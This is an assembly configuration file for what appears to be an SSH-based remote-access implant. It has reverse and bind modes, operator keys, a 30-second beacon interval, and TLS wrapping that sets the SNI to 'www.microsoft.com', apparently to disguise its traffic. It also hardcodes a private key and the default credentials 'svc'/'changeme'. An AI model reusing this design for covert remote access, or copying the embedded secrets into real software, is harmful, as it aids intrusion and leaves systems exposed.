%ifndef CONFIG_INC
%define CONFIG_INC

section .rodata
align 8

; Server address (network byte order)
global server_ip
server_ip:          dd 0x0100007F      ; 127.0.0.1

global server_port
server_port:        dw 0x1600          ; port 22 (0x0016 in BE)

; SSH credentials
global ssh_username
ssh_username:   db "svc"
ssh_username_len equ $ - ssh_username

global ssh_password
ssh_password:   db "changeme"
ssh_password_len equ $ - ssh_password

; Ed25519 host keypair (32 private + 32 public)
global host_keypair
host_keypair:
    ; Private key
    db 0x2a,0x54,0x1c,0x8c,0x08,0x33,0xb9,0xda,0x30,0x4f,0xaa,0x3b,0x33,0xdb,0x99,0x30,0xcd,0x97,0x01,0xf9,0xa4,0x7f,0xcf,0x21,0x00,0x36,0xa0,0xc6,0xb5,0x81,0x51,0x01
    ; Public key
    db 0x5f,0x96,0x39,0x8c,0x5a,0x31,0xc6,0xe9,0x55,0xd4,0x34,0xb4,0x43,0x2e,0x7e,0x20,0xa5,0x52,0x9a,0x89,0xcc,0x58,0x0e,0xeb,0x04,0xbe,0x65,0x12,0xc1,0x16,0xa8,0x7f

; Authorized operator public keys (up to 4, 32 bytes each)
global authorized_keys
authorized_keys:
    times 128 db 0                ; 4 * 32 bytes (placeholder)
global num_authorized_keys
num_authorized_keys:
    dd 0

; TLS wrapping mode (0=raw TCP on port 22, 1=SSH-inside-TLS on port 443)
global tls_mode
tls_mode:       db 0

global server_port_tls
server_port_tls:    dw 0xBB01          ; port 443 (0x01BB in BE)

; Bind mode (standalone SSH server)
global bind_mode
bind_mode:      db 1                    ; 0=reverse, 1=bind

global bind_port
bind_port:      dw 7777                 ; bind mode port (host byte order)

; SNI hostname for TLS ClientHello
global sni_hostname
global sni_hostname_len
sni_hostname:   db "www.microsoft.com"
sni_hostname_len_equ equ $ - sni_hostname
sni_hostname_len: dd sni_hostname_len_equ

; Program identity constants
%define PROGRAM_TYPE_SSH    0x04
%define PROGRAM_OS_LINUX    0x01
%define PROGRAM_ARCH_X64    0x01
%define BEACON_INTERVAL     30

%endif
